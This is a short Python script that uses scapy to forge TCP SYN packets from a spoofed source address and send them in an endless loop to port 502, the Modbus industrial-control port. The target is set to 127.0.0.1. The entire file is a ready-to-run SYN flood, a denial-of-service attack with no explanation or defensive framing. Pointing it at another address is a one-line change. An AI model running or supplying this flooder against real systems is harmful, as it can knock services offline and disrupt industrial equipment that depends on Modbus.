from scapy.all import *
from scapy.layers.inet import TCP, IP

target_ip = "127.0.0.1"  # Target IP
target_port = 502 # Target Port
IP_layer = IP(src="192.168.1.109", dst=target_ip)
TCP_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
p = IP_layer / TCP_layer
send(p, loop=1, verbose=0)

